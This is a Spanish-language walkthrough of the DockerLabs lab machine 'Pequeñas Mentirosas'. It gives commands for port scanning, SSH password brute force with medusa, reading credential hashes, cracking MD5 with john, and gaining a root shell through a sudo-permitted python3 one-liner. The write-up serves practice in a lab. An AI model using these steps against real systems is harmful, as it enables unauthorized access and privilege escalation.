---
layout: post
title: "Pequeñas Mentirosas"
date: 2024-12-06
 12:50:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Pequeñas Mentirosas </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Escaneamos los puertos, pillamos dos puertos que corren los servicios de ssh y apache.

`sudo nmap -p- -open -T5 --min-rate=5000 -sS -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/pequeñasmentirosas/nmap.png){:.margin}

**2\.** En la pagina web nos da una pista, pero fuzzeando de directorios no encontramos ninguno, asi que hacemos fuerza bruta al ssh. 

`http://172.17.0.2`

`medusa -h 172.17.0.2 -u a -P wordlists -M ssh -n 22 | grep SUCCESS`

![img](/notas/public/img/dockerlabs/pequeñasmentirosas/web.png){:.margin}
![img](/notas/public/img/dockerlabs/pequeñasmentirosas/medusa.png){:.margin}

**3\.** Nos conectamos por ssh, una vez dentro vamos a revisar la ruta srv/ftp que es donde se almacenan los archivos en el servidor, tenemos dos ficheros con hashes de usuarios existentes en el sistema.

`sshpass -p 'secret' ssh a@172.17.0.2`

`cd /srv/ftp`

`ls`

`grep bash /etc/passwd`

![img](/notas/public/img/dockerlabs/pequeñasmentirosas/ssh.png){:.margin}
![img](/notas/public/img/dockerlabs/pequeñasmentirosas/hashes.png){:.margin}

**4\.** Vemos que estos hashes tienen la misma longitud, para identificar el tipo de hash podemos usar la herramineta hash-identifier o la web [hashes](https://hashes.com/en/decrypt/hash)

`cat hash_a.txt`

`cat hash_spencer.txt`

`hash-identifier 890b787e76e086d3d76b3a5e9d6a7778`

`hash-identifier 7c6a180b36896a0a8c02787eeafb0e4c`

![img](/notas/public/img/dockerlabs/pequeñasmentirosas/cathashes.png){:.margin}
![img](/notas/public/img/dockerlabs/pequeñasmentirosas/dehashes.png){:.margin}

**5\.** Sabiendo que son md5 podemos usar john o hashcat para crackearlo, primero guardamos nuestras hashes en un fichero luego procedemos a crackearlo, encuentra una contraseña que es igual para ambos hashes.

`nano hashes.txt`

`john --format=raw-md5 --wordlists=/usr/share/wordlists/rockyou.txt hashes.txt`

![img](/notas/public/img/dockerlabs/pequeñasmentirosas/txt.png){:.margin}
![img](/notas/public/img/dockerlabs/pequeñasmentirosas/john.png){:.margin}

**6\.** Con esto migramos al usuario spencer y revisamos binarios SUID, tenemos el binario python3.

`su spencer`

`sudo -l`

![img](/notas/public/img/dockerlabs/pequeñasmentirosas/sudol.png){:.margin}

**7\.** Escalamos privilegios a root aprovechando el binario python3. Recurso [gtfobins](https://gtfobins.github.io/gtfobins/python/#sudo).

`sudo python3 -c 'import os; os.system("/bin/sh")'`

![img](/notas/public/img/dockerlabs/pequeñasmentirosas/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>